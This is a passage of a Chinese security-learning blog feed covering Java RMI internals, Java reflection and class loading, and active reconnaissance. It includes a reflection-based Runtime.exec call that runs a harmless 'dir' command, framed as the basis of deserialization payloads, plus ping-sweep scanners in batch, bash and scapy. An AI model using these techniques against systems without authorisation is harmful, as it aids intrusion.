接口创建动态代理</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070133637.png\" alt=\"image-20230407013315581\" /></p>\n<p>接下来首先看 RemoteObjectInvocationHandler 这个动态代理</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070145489.png\" alt=\"image-20230407014515460\" /></p>\n<p>继承 RemoteObject 实现 InvocationHandler，因此这是一个可序列化的、可使用 RMI 远程传输的动态代理类，对于动态代理我们这里重点看一下 invoke 方法</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070146035.png\" alt=\"image-20230407014619996\" /></p>\n<p>在  <code>invoke</code>  方法中，首先判断传入的  <code>proxy</code>  参数是否是一个代理类，如果不是，则抛出一个  <code>IllegalArgumentException</code>  异常。然后，判断传入的  <code>proxy</code>  参数是否与当前的  <code>InvocationHandler</code>  对象匹配，如果不匹配，则抛出一个  <code>IllegalArgumentException</code>  异常。最后，判断要调用的方法是不是  <code>Object</code>  类中的方法，如果是，则调用  <code>invokeObjectMethod</code>  方法来处理方法调用，否则调用  <code>invokeRemoteMethod</code>  方法来处理远程方法调用。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070148473.png\" alt=\"image-20230407014842429\" /></p>\n<p>在 invokeObjectMethod 中判断要调用的方法是不是  <code>Object</code>  类中的  <code>equals</code> 、 <code>hashCode</code>  或  <code>toString</code>  方法，如果是，则直接调用  <code>Object</code>  类中的相应方法，否则抛出一个  <code>UnsupportedOperationException</code>  异常。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070150296.png\" alt=\"image-20230407015000249\" /></p>\n<p>在  <code>invokeRemoteMethod</code>  方法中，会将方法调用序列化成字节流，并通过 JRMP 协议发送给远程对象。远程对象收到方法调用后，会将字节流反序列化成方法调用，并执行该方法，最后将方法的返回值序列化成字节流，通过 JRMP 协议发送给客户端。</p>\n<h3 id=\"服务注册\"><a class=\"anchor\" href=\"#服务注册\">#</a> 服务注册</h3>\n<p>实际上就是绑定过程</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304070200528.png\" alt=\"image-20230407020030495\" /></p>\n<p>首先调用了 <code>parseURL</code>  方法来解析 <code>name</code>  参数，然后通过 <code>getRegistry</code>  方法获取了一个 <code>Registry</code>  对象。接下来，如果 <code>obj</code>  参数为 <code>null</code> ，则会抛出 <code>NullPointerException</code>  异常。最后，使用 <code>registry.bind(parsed.name, obj)</code>  方法将 <code>obj</code>  对象绑定到命名服务中。</p>\n<p>这样一个流程来 javasec 上面总结的很详细</p>\n<p>RMI 底层通讯采用了 Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p>\n<ol>\n<li>RMI 客户端在调用远程方法时会先创建 Stub (  <code>sun.rmi.registry.RegistryImpl_Stub</code>  )。</li>\n<li>Stub 会将 Remote 对象传递给远程引用层 (  <code>java.rmi.server.RemoteRef</code>  ) 并创建  <code>java.rmi.server.RemoteCall</code>  (远程调用) 对象。</li>\n<li>RemoteCall 序列化 RMI 服务名称、Remote 对象。</li>\n<li>RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</li>\n<li>RMI 服务端的远程引用层 (  <code>sun.rmi.server.UnicastServerRef</code>  ) 收到请求会请求传递给 Skeleton (  <code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>  )。</li>\n<li>Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</li>\n<li>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</li>\n<li>RMI 客户端反序列化服务端结果，获取远程对象的引用。</li>\n<li>RMI 客户端调用远程方法，RMI 服务端反射调用 RMI 服务实现类的对应方法并序列化执行结果返回给客户端。</li>\n<li>RMI 客户端反序列化 RMI 远程方法调用结果。</li>\n</ol>\n<h2 id=\"rmi流程流量\"><a class=\"anchor\" href=\"#rmi流程流量\">#</a> RMI 流程（流量）</h2>\n<p>这里对 <code>需要注意的是RMI被调用的方法执行在客户端</code> ，P 牛的 JAVA 漫谈中抓包分析，但是我本地的包有较多的混淆流量流，这里直接用 P 牛的图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303280024784.png\" alt=\"image-20230328002451679\" /></p>\n<p>这个是整个流程</p>\n<p>首先这里有一次 TCP 握手，跟踪这个流</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071034441.png\" alt=\"image-20230407103458372\" /></p>\n<p>接着是一个协议确认，客户端向服务器发送了<em> StreamProtocol</em> 用于确认服务器是否支持此协议</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071056208.png\" alt=\"image-20230407105655174\" /></p>\n<p>接着是服务端向客户端发送的一个确认包确认 ip 和端口号</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071057648.png\" alt=\"image-20230407105719590\" /></p>\n<p>客户端发给服务器一个 ip 地址，这个 ip 是客户端的 ip 地址</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071058910.png\" alt=\"image-20230407105815867\" /></p>\n<p>接着发送 call 请求</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071101046.png\" alt=\"image-20230407110109999\" /></p>\n<p>服务端返回 Returndata 包</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071102087.png\" alt=\"image-20230407110212035\" /></p>\n<p>这段是 java 序列化后的内容，⾸先客户端连接 Registry，并在其中寻找 Name 是 Hello 的对象，这个对应数据流中的 Call 消息；然后 Registry 返回⼀个序列化的数据，这个就是找到的 Name=Hello 的对象，这个对应数据流中的 ReturnData 消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 192.18.0.1:12137 ，于是再与这个地址建⽴ TCP 连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello ()</p>\n<p>然后是服务端和客户端的 ping 包</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071105955.png\" alt=\"image-20230407110506927\" /></p>\n<p>最后一个输出消息包 DgcAck 指示客户端已接收到服务器返回值中的远程对象</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071106096.png\" alt=\"image-20230407110619069\" /></p>\n<p>接着就断开 tcp 连接</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304071113942.png\" alt=\"image-20230407111353918\" /></p>\n",
            "tags": [
                "java安全",
                "RMI"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/26/java%E5%8F%8D%E5%B0%84/",
            "url": "https://blog.xcu.icu/2023/03/26/java%E5%8F%8D%E5%B0%84/",
            "title": "java反射",
            "date_published": "2023-03-26T04:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>大佬几年前的文章还是能让我受益匪浅，这里浅记 java 反射的学习，参考了 P 牛的文章</p>\n<h2 id=\"java反射forname\"><a class=\"anchor\" href=\"#java反射forname\">#</a> java 反射 (forName)</h2>\n<p>首先看看官方对反射的解释</p>\n<pre><code class=\"language-perl\">Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions.\nThe API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control.\n</code></pre>\n<p>java 安全从反序列化入手，从反射入门反序列化，反射是大多数语言不可或缺的部分，对象可以通过反射来获取其他的类，类可以通过反射拿到所有的成员方法 ( <code>Methods</code> )、成员变量 ( <code>Fields</code> )、构造方法 ( <code>Constructors</code> )，这里所有就是字面意思上的所有，包括私有类</p>\n<h2 id=\"类的加载机制\"><a class=\"anchor\" href=\"#类的加载机制\">#</a> 类的加载机制</h2>\n<p>学习 java，不得不学习他的类加载机制，java 是依赖于 JVM 实现的跨平台语言，在运行时需要先编译成 class 文件，在初始化的时候会调用 java.lang.ClassLoader 加载类字节码这里贴一张大佬的图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303252145254.png\" alt=\"image-20230325214537182\" /></p>\n<p>类加载分为四层，一共有四层 classloader（程序在启动的时候不会一次性加载所有的 class 文件，而是根据程序的需要，通过 Java 的类加载机制来动态加载某个 class 文件到内存中）分别为</p>\n<ol>\n<li>\n<p>Extension ClassLoader：称为扩展类加载器，负责加载 Java 的扩展库，默认加载 JAVA_HOME/jre/bil/ext 下的所有 class 方法</p>\n</li>\n<li>\n<p>BootStrap ClassLoader：启动类加载器，是 Java 类加载层次顶层的类加载器，负责加载 JDK 中的核心类库，如：<strong>rt.jar、resources.jar、charsets.jar</strong></p>\n<pre><code class=\"language-java\">package lq;\nimport java.net.URL;\n\npublic class test &#123;\n    public static void main(String[] args)&#123;\n        URL[] urls = sun.misc.Launcher.getBootstrapClassPath().getURLs();\n        for (int i=0 ;i&lt;urls.length;i++)&#123;\n            System.out.println(urls[i].toExternalForm());\n        &#125;\n    &#125;\n&#125;\n\n</code></pre>\n<p>通过上面的代码，获取到该类加载器从哪些地方加载了相关的 jar 和 class 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303212059400.png\" alt=\"image-20230321205954293\" /></p>\n</li>\n<li>\n<p>App ClassLoader: 系统类加载器。负责加载应用程序 classpath 目录下的所有 jar 和 class 文件</p>\n</li>\n<li>\n<p>Custom ClassLoader：上面三个是 java 默认提供的 classloader，用户可以根据需要自定义自己的 ClassLoader 文件</p>\n</li>\n</ol>\n<h3 id=\"原理介绍\"><a class=\"anchor\" href=\"#原理介绍\">#</a> 原理介绍</h3>\n<p>ClassLoader 使用的是双亲委派模型来搜索类，每一个 ClassLoader 实例都有一个父类加载器的引用，当需要搜索某个类的时候，这个过程是从上至下的，首先 Bootstrap ClassLoader 尝试加载如果没有加载到，交由 Extension ClassLoader 尝试加载，没找到交由 APP ClassLoader 尝试加载，如果还是没有加载到这返回给委托的发起者，由其指定（虚拟机内置的类加载器（Bootstrap ClassLoader）本身没有父类加载器，但可以用作其它 ClassLoader 实例的的父类加载器）这里如果都没找到会抛出异常</p>\n<p><code>ClassLoader</code>  类有如下核心方法：</p>\n<ol>\n<li><code>loadClass</code> （加载指定的 Java 类）</li>\n<li><code>findClass</code> （查找指定的 Java 类）</li>\n<li><code>findLoadedClass</code> （查找 JVM 已经加载过的类）</li>\n<li><code>defineClass</code> （定义一个 Java 类）</li>\n<li><code>resolveClass</code> （链接指定的 Java 类）</li>\n</ol>\n<p>使用这样的模型可以避免重复加载类，夫类已经加载了这个类的时候，没必要子 ClassLoader 在进行一次加载</p>\n<p>Jvm 中两个类是否相同需要同时满足两个条件</p>\n<ol>\n<li>两个类名相同</li>\n<li>两个类是由同一个 ClassLoader 实例加载的</li>\n</ol>\n<p>贴一张大佬的图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303212115678.png\" alt=\"image-20230321211521499\" /></p>\n<h2 id=\"反射demo\"><a class=\"anchor\" href=\"#反射demo\">#</a> 反射 demo</h2>\n<p>下面这样一段代码，在参数传入之前不知道他的作用是什么</p>\n<pre><code class=\"language-java\">    public void execute(String className,String methodName) throws Exception&#123;\n        Class clazz = Class.forName(className);\n        clazz.getMethod(methodName).invoke(clazz.newInstance());\n    &#125;\n</code></pre>\n<p>上面的示例中利用到了反射中尤为重要的几种方法</p>\n<ol>\n<li>获取类的方法：forName</li>\n<li>实例化类对象的方法：newInstance</li>\n<li>获取函数的方法：getMethod</li>\n<li>执行函数的方法：invoke</li>\n</ol>\n<p>这几个方法包揽了 Java 按去哪里各种和反射有关的 pyaload</p>\n<p>这里记一下 new 一个类对象后都干了什么</p>\n<ol>\n<li>首先找到目标类文件并加载到内存中</li>\n<li>执行该类的 static 方法（如果有的话），通过该方法给目标类进行初始化</li>\n<li>在堆内存中开辟空间，分配内存地址</li>\n<li>在堆内存中建立对象特有属性，并进行默认初始化</li>\n<li>对属性进行显示初始化</li>\n<li>对对象进行构造代码块初始化</li>\n<li>对对象进行对应的构造函数初始化</li>\n<li>将内存地址交付给栈内存中定义变量</li>\n</ol>\n<p>forName 不是获取 “类” 的唯一途径，通常来说我们有如下三种方式获取一个 “类”，也就是 java.lang.class 对象</p>\n<ul>\n<li>obj.getclass () 如果上下文中存在某个类的示例 obj，那么我们可以通过直接通过 obj.getClass () 来获取类</li>\n<li>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。</li>\n<li>Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</li>\n</ul>\n<p>注：在一个 JVM 中，一个类只会有一个 “类对象” 存在</p>\n<pre><code class=\"language-java\">package demo;\n\npublic class demo &#123;\n    public String name=&quot;admin&quot;;\n    private String passwd=&quot;admin123&quot;;\n&#125;\n</code></pre>\n<p>下面通过 getName 来获取类对象</p>\n<pre><code class=\"language-java\">package lq;\n\n\npublic class test &#123;\n    public static void main(String[] args)&#123;\n        String classname=&quot;lq.demo&quot;;\n        try&#123;\n            Class pClass1 = Class.forName(classname);\n            System.out.println(pClass1);\n\n        &#125;catch(ClassNotFoundException e)&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n//class lq.demo\n</code></pre>\n<p>forName 有两个函数重载</p>\n<ol>\n<li>class&lt;?&gt; forName(String name)</li>\n<li>class&lt;?&gt; forName(String name,**boolean** initialize,ClassLoader loader)</li>\n</ol>\n<p>第一种是我们常用的方法，也就是上面的示例中所使用的方法，可以理解为第二种方式的一个封装，第一个参数是类名，第二个参数标识是否初始化，第三个参数是加载器，高数 javaVM 如何加载这个类</p>\n<p>上面有提到初始化，这里先看一个简单的类</p>\n<pre><code class=\"language-java\">package lq;\n\npublic class demo2 &#123;\n    &#123;\n        System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass());\n    &#125;\n    static &#123;\n        System.out.printf(&quot;Static initial %s\\n&quot;, demo2.class);\n    &#125;\n    public demo2() &#123;\n        System.out.printf(&quot;Initial %s\\n&quot;, this.getClass());\n    &#125;\n&#125;\n\n</code></pre>\n<p>下面写一个获取类，运行一下上面的方法</p>\n<pre><code class=\"language-java\">package lq;\n\n\nimport jdk.internal.org.objectweb.asm.Handle;\n\npublic class test &#123;\n    public static void main(String[] args)&#123;\n        String classname=&quot;lq.demo2&quot;;\n        try&#123;\n            Class pClass1 = Class.forName(classname);\n            Class pClass2 = demo2.class;\n            Class pClass3 = new demo2().getClass();\n            System.out.println(pClass2);\n\n        &#125;catch(ClassNotFoundException e)&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n/*\nStatic initial class lq.demo2\nEmpty block initial class lq.demo2\nInitial class lq.demo2\nclass lq.demo2\n*/\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303170039816.png\" alt=\"image-20230317003911738\" /></p>\n<p>⾸先调⽤的是 static {} ，其次是 {} ，最后是构造函数，其中， static {} 就是在 “类初始化” 的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super () 后⾯，但在当前构造函数内容的前⾯。所以说， forName 中的 initialize=true 其实就是告诉 Java 虚拟机是否执⾏” 类初始化 “。</p>\n<h2 id=\"反射创建对象\"><a class=\"anchor\" href=\"#反射创建对象\">#</a> 反射创建对象</h2>\n<p>在正常情况下，除了系统类，如果我们想要拿到一个类，首先需要 import 才能使用，而使用 forName 就不需要，这样对于我们攻击者来说十分有利的，我们可以加载任意的类</p>\n<p>在一些源码中或许可以看到类名的部分包含 $ 符号，它的作用是查找内部类，java 中如果一个类中编写另一个内，在编译的时候会生成两个文件，通过 Class.forName (&quot;c1$c2&quot;) 就可以加载这个内部类</p>\n<pre><code class=\"language-java\">获取类对象： Class classname = Class.fromName(&quot;demo.demo&quot;);\n获取构造器对象: Constructor con = class.getConstructor(形参.class);\n获取对象：demo demo = con.newInstance(实参)\n</code></pre>\n<p>写一个 demo 类，添加 6 种构造方法</p>\n<pre><code class=\"language-java\">package demo;\n\npublic class demo &#123;\n    public String name=&quot;admin&quot;;\n    public String passwd=&quot;admin123&quot;;\n\n    // 默认\n    demo(String str)&#123;\n        System.out.println(&quot;(默认)的构造方法 s = &quot;+str);\n    &#125;\n\n    //无参的构造方法\n    public demo()&#123;\n        System.out.println(&quot;调用了公有，无参构造方法&quot;);\n    &#125;\n\n    //一个参数的构造方法\n    public demo(char name)&#123;\n        System.out.println(&quot;姓名：&quot;+name);\n    &#125;\n\n    //有多个参数的构造方法\n    public demo(String name,String pass)&#123;\n        System.out.println(&quot;用户名：&quot;+name+&quot;密码：&quot;+pass);\n    &#125;\n\n    //受保护的构造方法\n    protected demo(boolean n)&#123;\n        System.out.println(&quot;受保护 n = &quot; + n);\n    &#125;\n\n    //私有构造方法\n    private demo(float pass)&#123;\n        System.out.println(&quot;私有的构造方法&quot;+pass);\n    &#125;\n&#125;\n\n</code></pre>\n<p>通过反射机制获取对象</p>\n<pre><code class=\"language-java\">import java.lang.reflect.Constructor;\n\npublic class demo &#123;\npublic static void main(String[] args) throws Exception&#123;\n    Class classname = Class.forName(&quot;demo.demo&quot;);\n\n    System.out.println(&quot;---------所有公有构造方法-----------&quot;);\n    Constructor[] conArray = classname.getConstructors();//获取所有“公有的”获取方法\n    for(Constructor c:conArray)&#123;\n        System.out.println(c);\n    &#125;\n\n    System.out.println(&quot;----------所有的构造方法(包括：私有，受保护，默认，，公有)----------&quot;);\n    conArray = classname.getDeclaredConstructors();//获取全部的构造方法\n    for(Constructor c:conArray)&#123;\n        System.out.println(c);\n    &#125;\n\n    System.out.println(&quot;----------获取公有的、无参的构造方法----------&quot;);\n    Constructor con = classname.getConstructor(null);//获取单个“公有的”构造方法\n    //这里的null写不写都行\n    System.out.println(&quot;Con = &quot; + con);\n    Object obj = con.newInstance();//实例化类对象的方法\n\n    System.out.println(&quot;----------获取私有的构造方法----------&quot;);\n    con = classname.getDeclaredConstructor(String.class);//获取构造方法，没有限制\n    System.out.println(con);\n    con.setAccessible(true);//暴力访问\n    obj = con.newInstance(&quot;admin123&quot;);\n&#125;\n&#125;\n/*\n---------所有公有构造方法-----------\npublic demo.demo(java.lang.String,java.lang.String)\npublic demo.demo(char)\npublic demo.demo()\n----------所有的构造方法(包括：私有，受保护，默认，，公有)----------\nprivate demo.demo(float)\nprotected demo.demo(boolean)\npublic demo.demo(java.lang.String,java.lang.String)\npublic demo.demo(char)\npublic demo.demo()\ndemo.demo(java.lang.String)\n----------获取公有的、无参的构造方法----------\nCon = public demo.demo()\n调用了公有，无参构造方法\n----------获取私有的构造方法----------\ndemo.demo(java.lang.String)\n(默认)的构造方法 s = admin123\n*/\n</code></pre>\n<p>获取构造器对象方法：</p>\n<ol>\n<li>批量的方法：\n<ul>\n<li>public Constructor [] getConstructors ()：所有” 公有的” 构造方法</li>\n<li>public Constructor [] getDeclaredConstructors ()：获取所有的构造方法 (包括私有、受保护、默认公有)</li>\n</ul>\n</li>\n<li>获取单个的方法:\n<ol>\n<li>public Constructor getConstructor (Class…parameterTypes): 获取单个的” 公有的” 构造方法</li>\n<li>public Constructor getDeclaredConstructor (Class…parameterTypes): 获取” 某个构造方法” 可以是私有的，或受保护、默认、公有；</li>\n</ol>\n</li>\n</ol>\n<p>这里在记录几个常用的函数</p>\n<ol>\n<li>class.newInstance () 的作用就是调用这个类的无参构造函数</li>\n<li>getMethod 的作用是通过反射获取一个类的某个特定的公有方法。</li>\n<li>invoke 的作用是执行方法</li>\n</ol>\n<h2 id=\"反射javalangruntime\"><a class=\"anchor\" href=\"#反射javalangruntime\">#</a> 反射 java.lang.Runtime</h2>\n<p>Runtime 没法直接 new，通过下面的方式创建这个对象</p>\n<pre><code class=\"language-java\">public class demo &#123;\n    public static void main(String[] args)&#123;\n    Runtime runtime = Runtime.getRuntime();\n    System.out.println(runtime);\n    &#125;\n&#125;\n//java.lang.Runtime@1b6d3586\n//1b6d3586这个是对象在内存中地址的16进制\n</code></pre>\n<p>下面是常用的几种方法</p>\n<ol>\n<li>freeMemory ()：Return JVM 的空闲内存量，以字节为单位。</li>\n<li>maxMemory ()：Return JVM 试图使用的最大内存量。</li>\n<li>totalMemory ()：Return JVM 中的内存总量。</li>\n<li>availableProcessors () :Return JVM 的处理器数量</li>\n<li>exit (int status): 通过启动其关闭序列来终止当前正在运行的 JVM</li>\n</ol>\n<p>代码演示</p>\n<pre><code class=\"language-java\">public class demo &#123;\n    public static void main(String[] args)&#123;\n    Runtime runtime = Runtime.getRuntime();\n    System.out.println(runtime);\n    System.out.println(&quot;JVM中的空闲内存量&quot;+runtime.freeMemory());\n    System.out.println(&quot;JVM试图使用的最大内存量&quot;+runtime.maxMemory());\n    System.out.println(&quot;JVM中内存总量&quot;+runtime.totalMemory());\n    System.out.println(&quot;JVM的处理器数量&quot;+runtime.availableProcessors());\n    &#125;\n&#125;\n//java.lang.Runtime@1b6d3586\n//        JVM中的空闲内存量250001304\n//        JVM试图使用的最大内存量3784310784\n//        JVM中内存总量255328256\n//        JVM的处理器数量12\n</code></pre>\n<p>这样看来 Runtime 似乎在安全方面没有太大的影响，实际上 java.lang.runtime 有一个 exec 方法可以执行本地命令，所以在很多的 payload 都会看到 Runtime 的身影，通过反射调用 Runtime 来执行本地系统命令</p>\n<p>首先是不使用反射执行本地命令</p>\n<pre><code class=\"language-java\">package Clown;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class demo &#123;\n    public static void main(String[] args) throws IOException &#123;\n        // 使用 Runtime 类的 exec() 方法在本地系统上执行命令\n        Process process = Runtime.getRuntime().exec(&quot;cmd /c dir&quot;);\n        // 使用 BufferedReader 和 InputStreamReader 读取命令的输出\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        // 逐行读取命令的输出，并打印到控制台上\n        String line;\n        while ((line = reader.readLine()) != null) &#123;\n            System.out.println(line);\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303261401582.png\" alt=\"image-20230326140122498\" /></p>\n<pre><code class=\"language-java\">import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.lang.reflect.Method;\n\npublic class demo &#123;\n    public static void main(String[] args) throws Exception&#123;\n        // 获取Runtime类的Class对象\n        Class RunClass = Class.forName(&quot;java.lang.Runtime&quot;);\n        // 获取Runtime类的getRuntime方法\n        Method getRuntimeMethod = RunClass.getMethod(&quot;getRuntime&quot;);\n        // 调用getRuntime方法获取Runtime类的实例\n        Object runtimeObjetct = getRuntimeMethod.invoke(null);\n\n        // 获取Runtime类的exec方法\n        Method exec = RunClass.getMethod(&quot;exec&quot;, String.class);\n        // 调用exec方法执行系统命令\n        Process process = (Process) exec.invoke(runtimeObjetct,&quot;cmd /c dir&quot;);\n        // 获取进程的标准输出流\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        // 逐行读取命令的输出，并打印到控制台上\n        String line;\n        while ((line = reader.readLine()) != null) &#123;\n            System.out.println(line);\n        &#125;\n    &#125;\n&#125;\n\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303261427357.png\" alt=\"image-20230326142727290\" /></p>\n",
            "tags": [
                "java安全",
                "java反射"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://blog.xcu.icu/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "主动信息收集",
            "date_published": "2023-03-19T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>主动信息收集是指与目标主机进行交互，从而获取所需要的目标信息，常见的主动信息收集包括：敏感目录，端口信息探测，系统版本，CMS 类型，服务器版本等</p>\n<h2 id=\"icmp\"><a class=\"anchor\" href=\"#icmp\">#</a> ICMP</h2>\n<p>ICMP 是网络控制报文协议，属于网络层，用于在 IP 主机，路由之间传递控制消息，尝尝被称为 “错误侦测与回报机制”，能够检测网路的连线状态，确保连线的准确性。</p>\n<h3 id=\"ping命令的功能\"><a class=\"anchor\" href=\"#ping命令的功能\">#</a> Ping 命令的功能</h3>\n<ol>\n<li>网络状态诊断：向特定的目的主机发送请求报文，测试目的站是否可达以及了解其工作状态</li>\n<li>探测主句存活：向特定的目的主机发送请求报文，如果目标主机返回应答数据包，则表达主机存活</li>\n<li>识别系统类别：向特定的目的主机发送请求报文，返回的 TTL 值可以判断目标主机系统类型</li>\n<li>查看域名对应的 ip 地址：Ping 域名，可返回该域名多对应的 ip 地址信息</li>\n</ol>\n<h3 id=\"功能概述\"><a class=\"anchor\" href=\"#功能概述\">#</a> 功能概述</h3>\n<ol>\n<li>request time out\n<ol>\n<li>目标已关机</li>\n<li>对方与自己不在同一网段内</li>\n<li>设置了 ICMP 数据包过滤</li>\n</ol>\n</li>\n<li>Destination host Unreachable\n<ol>\n<li>网线出了故障</li>\n</ol>\n</li>\n<li>Source quench received\n<ol>\n<li>表示对方或者中途服务器繁忙无法回应</li>\n</ol>\n</li>\n<li>unknown host name\n<ol>\n<li>DNS 配置不正确</li>\n<li>域名不正确</li>\n</ol>\n</li>\n<li>no rout to host\n<ol>\n<li>网卡工作不正常</li>\n</ol>\n</li>\n<li>transmit fai led，error code\n<ol>\n<li>10043 网卡驱动错误</li>\n</ol>\n</li>\n</ol>\n<p>TTL 值：Time To Live，表示 DNS 记录在 DNS 服务器上存在的时间，它是 IP 协议包的一个值，告诉路由器该数据何时需要被丢弃</p>\n<p>实际上是 Ip 数据包在计算机网络中可以转发的最大跳数 (有 IP 数据包的发送者设置)，在整个转发路径上，每经过一个路由都会修改这个 TTL 字段值，具体的做法就是减一，然后再将 IP 包转发出去</p>\n<p>通过 ping 返回的 TTL 值的大小可以粗略的判断目标主机的系统类型，默认情况下 Linux 为 64 或 255，win 系列是 128，unix 是 255</p>\n<h3 id=\"icmp主机探测\"><a class=\"anchor\" href=\"#icmp主机探测\">#</a> ICMP 主机探测</h3>\n<h3 id=\"windows-bat脚本\"><a class=\"anchor\" href=\"#windows-bat脚本\">#</a> Windows-bat 脚本</h3>\n<p>首先先记录一些 bash 语法</p>\n<ul>\n<li>echo off：关闭其他所有命令的回显</li>\n<li>@：关闭紧跟其后的一条命令的回显</li>\n<li>set/p ：在屏幕中输出信息（不换行），并接受用户输入的内容，赋值给 ip</li>\n<li>for  /L：for 循环以增量的形式从开始到结束</li>\n<li>% name%：用 % 将要调用的变量包起来就可以调用这个变量</li>\n<li>%% name：表示 name 为 for 里面的循环量</li>\n</ul>\n<p>ping 命令使用的帮助信息：</p>\n<ul>\n<li>-n：count 发送的回显请求数</li>\n<li>-l：发送缓冲区大小</li>\n<li>-w：每次等待回复的超时时间（毫秒）</li>\n</ul>\n<pre><code class=\"language-bash\">@echo off\nset /p ip=&quot;请输入IP地址段，格式如：&quot;192.168.1.&quot; &gt;&gt;&gt; &quot;\nfor /L %%i in (1,1,254) do (\nPing.exe -n 1 -l 16 -w 100 %ip%%%i |findstr TTL=  &gt;nul &amp;&amp; echo %ip%%%i is up. || echo %ip%%%i is down.\n)\necho 检测ping完成！&amp; pause\n</code></pre>\n<h3 id=\"linux-shell\"><a class=\"anchor\" href=\"#linux-shell\">#</a> Linux-shell</h3>\n<p>还是先记录用到的一些写法</p>\n<ul>\n<li>/bin/bash：利用 /bin/bash 执行 shell 脚本</li>\n<li>read：用于读取用户输入的字符</li>\n<li>for：for 循环以增量形式从开始到结束</li>\n</ul>\n<pre><code class=\"language-bash\">#!/bin/bash\n$ip\nread -p &quot;please inpur ip :&quot; ip\nfor((i=0;i&lt;=255;i++)); do\n\tping -c 1 -W 0.1   $ip$i &gt; /dev/null &amp;&amp; echo &quot;$ip$i is up.&quot; || echo &quot;$ip$i is down.&quot;\ndone\necho &quot;检测ping完成&quot;\n</code></pre>\n<h3 id=\"python代码实现\"><a class=\"anchor\" href=\"#python代码实现\">#</a> python 代码实现</h3>\n<pre><code class=\"language-python\">#!/usr/bin/python\n#coding:utf-8\nfrom scapy.all import *\nfrom random import randint\nfrom optparse import OptionParser\n\ndef Scan(ip):\n    ip_id = randint(1, 65535)\n    icmp_id = randint(1, 65535)\n    icmp_seq = randint(1, 65535)\n    packet=IP(dst=ip,ttl=64,id=ip_id)/ICMP(id=icmp_id,seq=icmp_seq)/b'rootkit'\n    result = sr1(packet, timeout=1, verbose=False)\n    if result:\n        for rcv in result:\n            scan_ip = rcv[IP].src\n            print(scan_ip + '---&gt;' 'Host is up')\n    else:\n        print(ip + '---&gt;' 'host is down')\n\ndef main():\n    parser = OptionParser(&quot;Usage:%prog -i &lt;target host&gt; &quot;)   # 输出帮助信息\n    parser.add_option('-i',type='string',dest='IP',help='specify target host')   # 获取ip地址参数\n    options,args = parser.parse_args()\n    print(&quot;Scan report for &quot; + options.IP + &quot;\\n&quot;)\n    # 判断是单台主机还是多台主机\n    # ip中存在-,说明是要扫描多台主机\n    if '-' in 